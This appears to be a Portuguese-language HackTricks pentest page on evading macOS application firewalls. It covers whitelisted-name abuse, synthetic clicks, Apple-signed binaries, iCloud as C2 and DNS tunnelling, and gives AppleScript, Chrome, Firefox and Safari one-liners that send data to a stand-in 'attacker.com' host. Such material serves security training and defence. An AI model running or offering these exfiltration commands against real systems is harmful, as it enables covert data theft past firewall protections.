# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Técnicas encontradas

As seguintes técnicas foram encontradas funcionando em alguns aplicativos de firewall do macOS.

### Abusando nomes de lista branca

- Por exemplo, chamando o malware com nomes de processos bem conhecidos do macOS como **`launchd`**

### Clique Sintético

- Se o firewall pedir permissão ao usuário, faça o malware **clicar em permitir**

### **Use binários assinados pela Apple**

- Como **`curl`**, mas também outros como **`whois`**

### Domínios bem conhecidos da Apple

O firewall pode estar permitindo conexões a domínios bem conhecidos da Apple, como **`apple.com`** ou **`icloud.com`**. E o iCloud pode ser usado como um C2.

### Bypass Genérico

Algumas ideias para tentar contornar firewalls

### Verifique o tráfego permitido

Saber o tráfego permitido ajudará você a identificar domínios potencialmente na lista branca ou quais aplicativos têm permissão para acessá-los.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusando do DNS

As resoluções de DNS são feitas através do aplicativo assinado **`mdnsreponder`**, que provavelmente será permitido contatar servidores DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Através de aplicativos de navegador

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via injeções de processos

Se você puder **injetar código em um processo** que tenha permissão para se conectar a qualquer servidor, você poderá contornar as proteções do firewall:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Referências

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
